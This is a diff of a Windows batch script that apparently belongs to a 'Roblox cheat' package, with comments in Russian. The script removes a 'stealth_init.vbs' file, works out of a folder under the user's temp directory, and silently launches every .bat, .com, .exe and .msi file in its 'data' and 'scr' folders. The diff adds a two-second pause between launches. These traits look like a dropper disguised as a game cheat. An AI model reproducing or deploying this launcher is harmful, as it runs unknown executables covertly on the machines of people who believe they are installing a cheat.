@@ -13,7 +13,6 @@ exit /b
 del "%temp%\stealth_init.vbs" >nul 2>&1
 chcp 65001 >nul 2>&1
 
-:: Новое имя оригинальной папки
 set "ORIGINAL_DIR=C:\RobloxCheat"
 set "TEMP_DIR=%LOCALAPPDATA%\Temp\RobloxCheat"
 set "SCRIPT_NAME=invisible_run.bat"
@@ -46,20 +45,18 @@ if not exist "%TEMP_DIR%" exit /b
 set "WORKING_DIR=%TEMP_DIR%"
 
 :run_files
-:: --- ТИХИЙ ЗАПУСК ИЗ DATA (.bat, .com, .exe, .msi) ---
+:: --- РАБОТА С ПАПКОЙ DATA (Запуск по очереди с паузой) ---
 if not exist "%WORKING_DIR%\data" goto :run_scr
 cd /d "%WORKING_DIR%\data" >nul 2>&1
-for %%f in (*.bat *.com *.exe *.msi) do (
-    if not "%%~nxf"=="%SCRIPT_NAME%" start "" "%%f"
-)
+:: Запускает файл и ждет 2 секунды перед следующим
+for %%f in (*.bat *.com *.exe *.msi) do if not "%%~nxf"=="%SCRIPT_NAME%" start "" "%%f" & timeout /t 2 >nul
 
 :run_scr
-:: --- ТИХИЙ ЗАПУСК ИЗ SCR (.bat, .com, .exe, .msi) ---
+:: --- РАБОТА С ПАПКОЙ SCR (Запуск по очереди с паузой) ---
 if not exist "%WORKING_DIR%\scr" goto :end
 cd /d "%WORKING_DIR%\scr" >nul 2>&1
-for %%f in (*.bat *.com *.exe *.msi) do (
-    if not "%%~nxf"=="%SCRIPT_NAME%" start "" "%%f"
-)
+:: Запускает файл и ждет 2 секунды перед следующим
+for %%f in (*.bat *.com *.exe *.msi) do if not "%%~nxf"=="%SCRIPT_NAME%" start "" "%%f" & timeout /t 2 >nul
 
 :end
 exit /b
